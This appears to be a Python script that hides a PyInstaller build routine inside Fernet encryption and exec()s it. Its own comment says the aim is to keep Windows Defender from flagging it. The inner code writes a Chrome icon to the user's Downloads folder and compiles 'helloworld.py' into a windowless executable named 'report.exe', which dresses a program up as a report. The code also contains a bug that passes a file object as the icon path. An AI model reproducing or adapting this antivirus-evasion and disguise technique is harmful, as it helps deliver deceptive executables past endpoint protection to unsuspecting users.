from cryptography.fernet import Fernet

# encrypting the code, so Windows Defender will not detect it as malicious
code = b"""

import PyInstaller.__main__
import shutil
import os
import base64

# base64 encoded icon string
encoded_icon = "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"

# Decode and save as an ICO file
home_dir = os.path.expanduser("~")
downloads_path = os.path.join(home_dir, "Downloads", "chrome.ico")



with open(downloads_path, 'wb') as icon_file:
    icon_file.write(base64.b64decode(encoded_icon))

exename = 'report.exe'
pwd = os.getcwd()

# Generate the executable file using PyInstaller
try:
    PyInstaller.__main__.run([
        'helloworld.py',
        '--clean',
        '--log-level=ERROR',
        '--onefile',
        '--noconsole',
        '--icon=' + icon_file,
        '--name=report'
    ])

    # Move the executable to the current directory and rename it
    dist_path = os.path.join(pwd, 'dist', 'report.exe')
    if os.path.exists(dist_path):
        shutil.move(dist_path, os.path.join(pwd, exename))
    else:
        raise FileNotFoundError(f"{dist_path} not found. Check if PyInstaller ran successfully.")

    # Clean up auto-generated files and directories
    #print("Removing build directory")
    shutil.rmtree(os.path.join(pwd, 'build'), ignore_errors=True)
    #print("Removing dist directory")
    shutil.rmtree(os.path.join(pwd, 'dist'), ignore_errors=True)
    #print("Removing spec file")
    spec_file = os.path.join(pwd, 'report.spec')
    if os.path.exists(spec_file):
        os.remove(spec_file)


except Exception as e:
    print(f"An error occurred: {e}")
"""

key = Fernet.generate_key()
encryption_type = Fernet(key)
encrypted_message = encryption_type.encrypt(code)

decrypted_message = encryption_type.decrypt(encrypted_message)
exec(decrypted_message)